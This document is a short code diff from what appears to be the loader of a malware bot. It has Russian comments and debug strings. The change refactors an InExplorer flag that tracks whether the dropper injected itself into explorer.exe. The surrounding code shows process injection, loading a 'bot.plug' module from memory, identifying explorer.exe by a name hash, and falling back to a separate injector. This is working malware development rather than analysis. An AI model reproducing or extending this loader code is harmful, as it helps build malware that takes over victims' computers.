@@ -27,7 +27,6 @@ namespace DROPPERDEBUGSTRINGS
 
 char  DropperName[MAX_PATH];  // Имя ехе стартующего файла
 DWORD DropperPID = 0;         // PID дропера бота
-BOOL  InExplorer = FALSE;     // Пизнак того что удалось заинжектиться в эксплорер
 
 
 typedef BOOL (WINAPI *TSetBotParameter)(DWORD ParamID, PCHAR Param);
@@ -100,7 +99,7 @@ DWORD WINAPI DropperMainProc(LPVOID)
 {
 
 	BOT::Initialize();
-	DRPDBG("_BOT_LOADER", "Запущена основная функция лоадера. В эксплорере %d, в процессе: \r\n%s", InExplorer, Bot->ApplicationName().t_str());
+	DRPDBG("_BOT_LOADER", "Запущена основная функция лоадера. Процесс: \r\n%s", Bot->ApplicationName().t_str());
 
 	// Запускаем систему информирования о повторном запуске
 	BOT::TryCreateBotInstance();
@@ -114,6 +113,7 @@ DWORD WINAPI DropperMainProc(LPVOID)
 		DRPDBG("_BOT_LOADER", "bot.plug успешо загружен");
 		LPVOID Handle = MemoryLoadLibrary(Plugin,  false);
 		StartBotPlug(Handle);
+		bool InExplorer = File::GetNameHashA(Bot->ApplicationName().t_str(),  true) == 0x490A0972 /* explorer.exe */;
 		if (!InExplorer)
 		{
 			// Если не удалось заинжектиться в эксплорер стартуем инжектор
@@ -162,6 +162,8 @@ int APIENTRY LoaderMain()
 		DRPDBG("_BOT_LOADER", "Запускается загрузчик бота");
 		DropperPID = GetCurrentProcessId();
 		GetModuleFileNameA(NULL, DropperName, MAX_PATH);
+
+		bool InExplorer = false;
 		if (!IsWIN64())
 			InExplorer = InjectIntoExplorer(DropperMainProc);
 		if (!InExplorer)
